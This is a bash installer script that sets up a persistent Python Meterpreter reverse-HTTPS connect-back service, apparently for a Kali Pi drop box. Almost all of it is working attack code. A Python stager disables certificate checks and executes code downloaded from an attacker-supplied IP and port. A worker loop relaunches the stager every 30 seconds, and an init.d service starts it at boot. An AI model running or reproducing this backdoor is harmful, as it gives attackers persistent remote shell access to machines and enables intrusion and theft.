#!/bin/bash

# By sn0wfa11
# https://github.com/sn0wfa11/

# This script will install a python https based connect back service.
# The computer catching the shells will need to be running metasploit
# using the python/meterpreter/reverse_https payload.

RED='\033[1;31m'
GRN='\033[1;32m'
BLUE='\033[0;34m'
YEL='\033[1;33m'
PURP='\033[1;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color
STAT="${GRN}[*] ${NC}"

printf "\n${BLUE}####################################################\n"
printf "# ${YEL}Kali-Pi Python HTTPS Connect Back - Setup Script ${BLUE}#\n"
printf "${BLUE}#--------------------------------------------------#\n"
printf "${BLUE}# ${CYAN}   By sn0wfa11 - https://github.com/sn0wfa11/    ${BLUE}#\n"
printf "${BLUE}####################################################\n\n"
printf "${NC}This script will install a python https based connect back service\n"
printf "The computer catching the shells will need to be running Metasploit\n"
printf "using the ${GRN}python/meterpreter/reverse_https ${NC}payload.\n\n"
printf "${RED}This script will not validate your inputs! That's your job!\n\n${NC}"

# Get and setup install path
printf "Please enter a location to install the script. [Enter for /root]"
read choice

if [ -z ${choice// } ]; then
  INSTALL_PATH="/root"
else
  INSTALL_PATH=$choice
fi

if [ "${INSTALL_PATH: -1}" == "/" ]; then
  INSTALL_PATH="${INSTALL_PATH::-1}"
fi

if [ ! -d $INSTALL_PATH ]; then
  printf "{STAT}Install Path Does not exist. Setting it up now..."\n
  mkdir $INSTALL_PATH
fi

cd $INSTALL_PATH

good=0
while [ $good -eq 0 ]; do
  printf "Please enter an IP address to connect to: "
  read choice
  if [ ! -z ${choice// } ]; then
    IP_ADDR=$choice
    good=1
  fi
done

good=0
while [ $good -eq 0 ]; do
  printf "Please enter a port on IP $IP_ADDR to connect to: "
  read choice
  if [ ! -z ${choice// } ]; then
    PORT=$choice
    good=1
  fi
done

printf "${STAT}Writing met_https to $INSTALL_PATH\n"
cat << EOF > met_https
#!/usr/bin/python

import sys, string, random, ssl

# Helper for the Metasploit https Checksum Algorithm
def checksum8(string):
  return sum([ord(char) for char in string]) % 0x100

# Generate a Metasploit https Handler Compatible Checksum for the URL
def get_url(host, port):
  check_sum = 80 # Python Checksum for MSF Payloads
  base = string.ascii_letters + string.digits
  for x in xrange(64):
    leng = random.randint(8, 60)
    uri = "".join(random.sample(base, leng))
    candidate = "".join(sorted(list(string.ascii_letters+string.digits), key=lambda *args: random.random()))
    for char in candidate:
      if checksum8(uri + char) == check_sum:
        return "https://" + host + ":" + port + "/" + uri + char

if len(sys.argv) != 3:
  print "Usage: " + argv[0] + " <IP Address/URL> <Port>"
  sys.exit(0)

# Send Shell
vi=sys.version_info
ul=__import__({2:'urllib2',3:'urllib.request'}[vi[0]],fromlist=['build_opener','HTTPSHandler'])
hs=[]
if (vi[0]==2 and vi>=(2,7,9)) or vi>=(3,4,3):
  sc=ssl.SSLContext(ssl.PROTOCOL_SSLv23)
  sc.check_hostname=False
  sc.verify_mode=ssl.CERT_NONE
  hs.append(ul.HTTPSHandler(0,sc))
o=ul.build_opener(*hs)
o.addheaders=[('User-Agent','Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko')]
exec(o.open(get_url(sys.argv[1], sys.argv[2])).read())
EOF

chmod 0700 met_https

sub1="$"
sub1+="x"

printf "${STAT}Writing connect_worker to $INSTALL_PATH\n"
cat << EOF > connect_worker
#!/bin/bash

x=1
while [ $sub1 -eq 1 ]
do
  if ! pgrep -f met_https > /dev/null; then ${INSTALL_PATH}/met_https $IP_ADDR $PORT; fi #Usage met_https <IP ADDR> <PORT>
  sleep 30
done
EOF

chmod 0700 connect_worker

sub1="$"
sub1+="1"

printf "#{STAT}Writing pyconnect to /etc/init.d\n"
cat << EOF > /etc/init.d/pyconnect
#!/bin/sh
# /etc/init.d/pyconnect

### BEGIN INIT INFO
# Provides:          pyconnect
# Required-Start:    $remote_fs $syslog
# Required-Stop:     $remote_fs $syslog
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: Starts the Py-Connect HTTPS Meterpreter Process
# Description:       This script will start and stop the Python HTTPS Meterpreter Service.
### END INIT INFO.

case "$sub1" in
  start)
    echo "Starting pyconnect"
    $INSTALL_PATH/connect_worker &
    ;;
  stop)
    echo "Stopping pyconnect"
    killall connect_worker
    ;;
  *)
    echo "Usage: /etc/init.d/pyconnect {start|stop}"
    exit 1
    ;;
esac

exit 0
EOF

chmod 0700 /etc/init.d/pyconnect
printf "#{STAT}Setting pyconnect to start at boot\n"
update-rc.d pyconnect defaults
printf "${STAT}Starting pyconnect\n"
/etc/init.d/pyconnect start
printf "${GRN}Done!${NC}\n\n"
printf "${STAT}You can change the IP Address and Port by editing $INSTALL_PATH/connect_worker\n"




